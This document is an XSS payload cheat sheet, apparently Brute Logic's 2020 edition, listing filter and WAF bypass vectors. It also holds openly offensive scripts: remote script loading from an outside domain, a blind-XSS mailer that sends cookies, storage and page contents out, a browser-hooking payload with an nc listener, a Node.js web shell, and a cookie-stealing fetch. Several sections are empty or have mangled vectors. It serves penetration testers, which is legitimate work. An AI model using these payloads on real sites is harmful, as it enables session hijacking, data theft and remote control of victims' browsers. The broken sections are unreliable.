# Cross-Site Scripting (XSS) Cheat Sheet – 2020 Edition

## Mixed Context Reflection Entity Bypass
This technique is used to transform a filtered reflection in a script block into valid JavaScript code. It requires the reflection to be present in both HTML and JavaScript contexts, in that order, and close to each other. The `svg` tag ensures that even if single quotes are encoded as `&#39;` or `&apos;` (sanitized), the code will still be valid for breaking out of the current value and triggering an alert.

### Vectors for Different JavaScript Scenarios:
- **Single Quote Sanitized:**
  ```html
  "'>-alert(1)-'
  ```
- **Single Quote Fully Escaped:**
  ```html
  "&#39-alert(1)-&#39
  ```
- **Double Quote Sanitized:**
  ```html
  ">alert(1)-"
  ```
- **Double Quote Fully Escaped:**
  ```html
  "&#34>alert(1)-&#34
  ```

## Strip-My-Script Vector
This vector is used to trick filters that strip classic and well-known XSS vectors. It works even if `“”` is stripped.

## Javascript Alternative Comments
Use this when regular JavaScript comments (`//`) are not allowed, escaped, or removed.

## JS Lowercased Input
Use this when the target application converts your input to lowercase via JavaScript. It may also work for server-side lowercase operations.

## Overlong UTF-8
Use this when the target application performs best-fit mapping.

```html
%CA%BA>%EF%BC%9Csvg/onload%EF%BC%9Dalert%EF%BC%881)>
```

## Vectors Exclusive for ASP Pages
These vectors are used to bypass specific filters in ASP pages.

- **Vector 1:**
  ```html
  %u3008svg onload=alert(2)>
  ```
- **Vector 2:**
  ```html
  %uFF1Csvg onload=alert(3)>
  ```

## PHP Email Validation Bypass
Use this to bypass the `FILTER_VALIDATE_EMAIL` flag of PHP’s `filter_var()` function.

```html
">"@x.y
```

## PHP URL Validation Bypass
Use this to bypass the `FILTER_VALIDATE_URL` flag of PHP’s `filter_var()` function.

```html
javascript://%250Aalert(1)
```

### Query Required
Use this to bypass the `FILTER_FLAG_QUERY_REQUIRED` flag of PHP’s `filter_var()` function.

- **Vector 1:**
  ```html
  javascript://%250Aalert(1)//?1
  ```
- **Vector 2:**
  ```html
  javascript://%250A1?alert(1):0
  ```
- **With Domain Filter:**
  ```html
  javascript://https://DOMAIN/%250A1?alert(1):0
  ```

## DOM Insertion via Server Side Reflection
Use this when input is reflected into the source and cannot execute by reflecting but by being inserted into the DOM. This avoids browser filtering and WAFs.

```html
\74svg o\156load\75alert\501\51\76
```

## XML-Based Vector for Bypass
Use this to bypass browser filtering and WAFs in XML pages. Prepend a `-->` to the payload if it lands in a comment section or `]]>` if it lands in a CDATA section.

```html
alert(1)
```

## Javascript Context - Code Injection (IE11/Edge Bypass)
Use this to bypass Microsoft IE11 or Edge when injecting into a JavaScript context.

```html
';onerror=alert;throw 1//
```

## HTML Context - Tag Injection (IE11/Edge XSS Bypass)
Use this to bypass their native filter in multi-reflection scenarios.

```html
"'>confirm&lpar;1){{$new.constructor(a)()}}
```

## Inside Comments Bypass
Use this vector if anything inside HTML comments is allowed (regex: `//`).

## Agnostic Event Handlers Vectors – Native Script Based
These vectors use event handlers with arbitrary tag names to bypass blacklists. They require some script loaded in the page after the point of injection in the source code.

- **Vector 1:**
  ```html
  x{animation:s}@keyframes s{}
  ```
- **Vector 2:**
  ```html
  *{transition:color 1s}*:hover{color:red}
  ```

## Remote Script Call
Use this when you need to call an external script, but the XSS vector is handler-based.

- **HTML-based:**
  ```html
  "var x=new XMLHttpRequest();x.open('GET','//brutelogic.com.br/0.php');x.send();
  x.onreadystatechange=function(){if(this.readyState==4){write(x.responseText)}}"
  ```
- **JavaScript-based:**
  ```html
  with(document)body.appendChild(createElement('script')).src='//brutelogic.com.br/2.js'
  ```

## Invisible Foreign XSS Embedding
Use this to load an XSS from another domain (or subdomain) into the current one. Restricted by the target’s `X-Frame-Options` (XFO) header.

```html
<iframe style="display:none" src="//brutelogic.com.br/xss.html"></iframe>
```

## Simple Virtual Defacement
Use this to change how the site appears to the victim by providing HTML code.

```html
document.documentElement.innerHTML = 'Not Found';
```

## Blind XSS Mailer
Use this as a blind XSS remote script, saving it as a PHP file and changing the `$to` and `$headers` variables accordingly. A working mail server like Postfix is required.

```javascript
var mailer = '';
var msg = 'USER AGENT\n' + navigator.userAgent + '\n\nTARGET URL\n' + document.URL;
msg += '\n\nREFERRER URL\n' + document.referrer + '\n\nREADABLE COOKIES\n' + document.cookie;
msg += '\n\nSESSION STORAGE\n' + JSON.stringify(sessionStorage) + '\n\nLOCAL STORAGE\n' + JSON.stringify(localStorage);
msg += '\n\nFULL DOCUMENT\n' + document.documentElement.innerHTML;
var r = new XMLHttpRequest();
r.open('POST', mailer, true);
r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
r.send('origin=' + document.location.origin + '&msg=' + encodeURIComponent(msg));
```

## Browser Remote Control
Use this to hook the browser and send JavaScript commands to it interactively. Use the JavaScript code below instead of `alert(1)` in your injection, and open an Unix-like terminal with the following shell script (listener). Provide a `HOST` as a hostname, IP address, or domain to receive commands from the attacker's machine.

- **JavaScript (payload):**
  ```javascript
  setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:5855'},100);
  ```
- **Listener (terminal command):**
  ```sh
  $ while :; do printf "j$ "; read c; echo $c | nc -lp 5855 >/dev/null; done
  ```

## Node.js Web Shell
Use this to create a web shell in vulnerable Node.js applications. After running the payload, use the shell in the following way: `http://target:5855/?cmd=my_node.js_command`.

```javascript
cmd=require('child_process').exec('gnome-calculator');
require('http').createServer(function(req,res){res.end(1-eval(require('url').parse(req.url,1).query.cmd))}).listen(5855);
```

## Cookie Stealing
Use this to get all cookies from the victim user set by the target site. It cannot get cookies protected by the `httpOnly` security flag. Encode `+` as `%2B` in URLs.

```javascript
fetch('//brutelogic.com.br/?c=' + document.cookie);
```

## XSS Online Test Page
Use this to practice XSS vectors and payloads. Check the source code for injection points.

- **URL:**
  ```html
  https://brutelogic.com.br/xss.php
  ```

## HTML Entities Table
Use this to HTML encode characters.

- **URL:**
  ```html
  https://brutelogic.com.br/utils/charref.htm
  ```

## Multi-Case HTML Injection
Use this as a one-shot to have higher successful XSS rates. It works in all cases of the HTML context, including the JS one with tag injection. Notice the spaces as failover for simple sanitizing/escaping performed by the app.

- **Base64:**
  ```html
  PC9TY3JpcHQvIictLT48Qm9keSAvQXV0b2ZvY3VzIC9PbkZvY3VzID0gY29uZmlybWAxYC
  A8IS0tPg==
  ```

## Vectors for Fixed Input Length
Use these when the input must have a fixed length, such as in common hashes.

- **MD5:**
  ```html
  12345678901
  ```
- **SHA1:**
  ```html
  1234567890123456789
  ```
- **SHA256:**
  ```html
  1234567890123456789012345678901234567890123
  ```

## PHP Sanitizing for XSS
Use this to bypass PHP sanitizing for XSS.

---

© 2020 Brute Logic – All rights reserved.